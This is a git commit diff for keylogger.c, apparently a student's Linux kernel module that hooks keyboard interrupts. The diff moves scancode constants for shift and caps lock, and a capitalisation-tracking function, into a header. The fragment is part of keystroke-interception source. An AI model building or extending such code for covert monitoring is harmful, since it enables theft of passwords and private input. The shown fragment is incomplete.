c059e5175cf990c445f53412acc8067005badfd9
kwshoemaker2 <kwshoemaker@lcmail.lcsc.edu>
2015-11-07 18:46:05 -0900

    added lookup tables for cases where the keyboard is normal, shift is on, and caps lock is on

--- keylogger.c
+++ keylogger.c
@@ -2,32 +2,8 @@
 #include <linux/interrupt.h>
 #include <asm/io.h>
 
-#define KBD_INT 1
+#include "keylogger.h"
 
-#define LSHIFT_ON 	0x2A
-#define RSHIFT_ON 	0x36
-#define LSHIFT_OFF 	0xAA
-#define RSHIFT_OFF 	0xB6
-#define CAPS_ON		0x3A
-#define CAPS_OFF	0xBA
-
-#define CONTROL_CODE 	5
-#define NEW_CHARACTER	6
-
-
-static int cap_on = 0;
-
-int handle_scancode(unsigned char scancode, char *dest)
-{
-	if(scancode == LSHIFT_ON || scancode == RSHIFT_ON || scancode == CAPS_ON) {
-		cap_on = 1;
-		return CONTROL_CODE;
-
-	} else if(scancode == LSHIFT_OFF || scancode == RSHIFT_OFF || scancode == CAPS_OFF) {
-		cap_on = 0;
-		return CONTROL_CODE;
-	}
-}
 
 /*
  This function services keyboard interrupts.
